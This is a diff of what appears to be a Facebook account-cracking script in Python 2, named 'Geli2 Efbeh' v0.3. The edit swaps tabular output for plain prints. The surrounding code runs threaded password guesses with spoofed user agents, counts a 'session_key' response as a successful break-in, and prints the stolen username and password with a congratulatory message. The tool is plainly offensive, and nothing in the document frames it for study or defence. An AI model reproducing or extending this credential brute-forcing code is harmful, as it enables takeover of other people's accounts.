@@ -3,7 +3,6 @@
 #  Tools : Geli2 Efbeh
 #  Versi : 0.3
 
-from prettytable import PrettyTable
 from multiprocessing.pool import Process, ThreadPool
 from useragents import user_agents, string1, string2, deviv, divev
 import os, sys, time, requests, json
@@ -62,12 +61,9 @@ def br_dev1(paswq):
 	jsl = json.loads(dev_id)
 	if "session_key" in dev_id or "www.facebook.com" in jsl["error_msg"]:
 	  try:
-		x = PrettyTable()
 		print s
-		x.add_column("\033[92;1mUsername\033[97;1m", ['\033[96;1m'+usr+'\033[97;1m'])
-		x.add_column("\033[92;1mPassword\033[97;1m", ['\033[96;1m'+pas+'\033[97;1m'])
-		print '\033[97;1m'
-		print x
+		print "\033[92;1m  Username ====>\033[97;1m ", usr
+		print "\033[92;1m  Password ====>\033[97;1m ", pas
 		divev()
 		deviv()
 		raw_input('\n\033[96;1m  Selamat Anda Sedang Beruntung :)\n Tekan CTRL Z Untuk Berhenti...\n')
